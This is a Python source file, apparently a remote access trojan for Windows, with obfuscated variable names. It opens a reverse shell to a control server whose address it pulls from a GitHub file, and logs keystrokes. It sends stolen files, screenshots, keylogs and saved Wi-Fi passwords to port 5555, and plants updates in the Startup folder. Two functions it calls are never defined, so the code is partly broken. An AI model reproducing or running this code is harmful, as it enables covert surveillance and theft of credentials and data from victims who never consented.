import subprocess,socket,time,requests,os,logging
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
uVZfpWIuxaI = ""
fSonJzjwpEqoEezrS = ""
wVhjOlngUrOPUihaIrmzv = "09.12.24.1"
ujwyLxr = "!"
yDztkDjkeVLAqDiwRb = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
XaqwqvXbkTJCo = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LOGGING_PATH = os.path.expanduser("~\\AppData\\Local\\")
def tChmyPWHKXYK(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def lLlUcJAxIcCOMxpcm(s):
	reGLTpluUxmEvfHhOCudYH = s.recv(1024)
	if len(reGLTpluUxmEvfHhOCudYH)==0:
		return True
	qoAxWkMsNzDpGjuUYebmj = reGLTpluUxmEvfHhOCudYH.decode("utf-8").replace("\n","")
	if not qoAxWkMsNzDpGjuUYebmj.startswith(ujwyLxr):
		proc = subprocess.run(qoAxWkMsNzDpGjuUYebmj, shell=True, capture_output=True)
		LevatRpucUT = proc.stdout + proc.stderr
		s.send(LevatRpucUT)
		return
	YhYCDpZdXyFVC = qoAxWkMsNzDpGjuUYebmj.split(" ")[0][1:]
	if YhYCDpZdXyFVC == "download":
		VQRkFZQVsUvfmE(s, qoAxWkMsNzDpGjuUYebmj)
	elif YhYCDpZdXyFVC == "screenshot":
		NaXEYHAZTJeMmsu(s)
	elif YhYCDpZdXyFVC == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif YhYCDpZdXyFVC == "update":
		manualUpdate(s)
	elif YhYCDpZdXyFVC == "wifi":
		getWiFiPasswords(s)
def VQRkFZQVsUvfmE(s, qoAxWkMsNzDpGjuUYebmj):
	bGtgnoMQVyerl = qoAxWkMsNzDpGjuUYebmj.replace(ujwyLxr+"download ","").split(",")
	LevatRpucUTs = ""
	for f in bGtgnoMQVyerl:
		LevatRpucUTs += LxqQtgGcVNGOEFsBDmsIC(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(LevatRpucUTs, "utf-8"))
def NaXEYHAZTJeMmsu(s):
	aEHuFufrBcl = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	EwYJuPxGiBsigMZe = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	aEHuFufrBcl.save(EwYJuPxGiBsigMZe)
	aEHuFufrBcl.close()
	r = LxqQtgGcVNGOEFsBDmsIC(EwYJuPxGiBsigMZe, "api/sscap")
	os.remove(EwYJuPxGiBsigMZe)
	s.send(bytes(r,"utf-8"))
def LxqQtgGcVNGOEFsBDmsIC(lfKEFSmRmnVCpXwHswxByn, rnPzrEfcpYelxvcKbRn, bQvyspJTVXoJOyaRHNlgseC=None):
	if not os.path.isfile(lfKEFSmRmnVCpXwHswxByn):
		return "[!] 404: "+lfKEFSmRmnVCpXwHswxByn+"\n"
	headers = {"user":os.getlogin()}
	if bQvyspJTVXoJOyaRHNlgseC is not None:
		headers = {**headers, **bQvyspJTVXoJOyaRHNlgseC}
	requests.post("http://"+uVZfpWIuxaI+":5555/"+rnPzrEfcpYelxvcKbRn,
		files={"file":open(lfKEFSmRmnVCpXwHswxByn, "rb")},
		headers=headers)
	return "[+] 200: "+lfKEFSmRmnVCpXwHswxByn+"\n"
def manualUpdate(s):
	h, p, v = getStartupInfo(True)
	if (v != wVhjOlngUrOPUihaIrmzv):
		update(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def getWiFiPasswords(s):
	profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	wifiPasswords = ""
	for p in profiles:
		try: wifiPasswords+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: wifiPasswords+=f"    {p} - N/A\n"
	s.send(wifiPasswords)
def update(VqPKyTzndRtfMoQBRSU):
	UUcKyXikAJtnjovfUzfX = os.path.basename(__file__)
	fileType = UUcKyXikAJtnjovfUzfX.split(".")[-1]
	bQbHgLcFXXibbDFr = UUcKyXikAJtnjovfUzfX.split(".")[0]+"."+VqPKyTzndRtfMoQBRSU+".pyw" if fileType.startswith("py") else ".exe"
	awwlqgDRlg = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), bQbHgLcFXXibbDFr)
	if not os.path.isfile(awwlqgDRlg):
		with open(bQbHgLcFXXibbDFr, "w+") as f:
			f.write(requests.get(XaqwqvXbkTJCo+"file."+ "pyw" if awwlqgDRlg.split(".")[-1].startswith("py") else "exe").text)
def getStartupInfo(force=False):
	global uVZfpWIuxaI, fSonJzjwpEqoEezrS
	if force or uVZfpWIuxaI == "" or fSonJzjwpEqoEezrS == "":
		reGLTpluUxmEvfHhOCudYH = requests.get(yDztkDjkeVLAqDiwRb).text.replace("\n","").split(":")
		uVZfpWIuxaI = reGLTpluUxmEvfHhOCudYH[0].strip()
		fSonJzjwpEqoEezrS = reGLTpluUxmEvfHhOCudYH[1].strip()
		VqPKyTzndRtfMoQBRSU = reGLTpluUxmEvfHhOCudYH[2].strip()
	return uVZfpWIuxaI, fSonJzjwpEqoEezrS, VqPKyTzndRtfMoQBRSU
def checkKeyLogs():
	try:
		logFileName = "settings.xpb"
		logFiles = sorted([file for file in os.listdir(LOGGING_PATH) if os.path.isfile(LOGGING_PATH+"\\"+file) and file.endswith(logFileName.split(".")[-1])])
		if logFileName in logFiles:
			logFiles.remove(logFileName)
		logFileFullPath = os.path.join(LOGGING_PATH,logFileName)
		if len(logFiles) > 0:
			with open(logFileFullPath, "ab+") as f:
				for file in logFiles:
					temp = os.path.join(LOGGING_PATH,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		LxqQtgGcVNGOEFsBDmsIC(logFileFullPath, "api/log")
		if os.path.isfile(logFileFullPath):
			os.remove(logFileFullPath)
	except Exception as e:
		print(e)
		pass
def startKeyLogging():
	logging.basicConfig(filename=(LOGGING_PATH+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def logKey(k):
		logging.info(str(k))
	k=Listener(on_press=logKey)
	loggers = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in loggers:
		l.setLevel(logging.CRITICAL)
	k.start()
def IByMzoI():
	h, p, v = BSTCjbMDl()
	checkKeyLogs()
	acKVFoxNUBFoHiDAXTjDezR()
	if wVhjOlngUrOPUihaIrmzv != v:
		update(v)
	startKeyLogging()
	sIpnFoTkBzBRUNHsTPgZNpm = bytes("["+wVhjOlngUrOPUihaIrmzv+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				YMcvLHarfar=False
				try:
					s=tChmyPWHKXYK(h, p)
					while not YMcvLHarfar:
						s.send(sIpnFoTkBzBRUNHsTPgZNpm)
						YMcvLHarfar=lLlUcJAxIcCOMxpcm(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
IByMzoI()
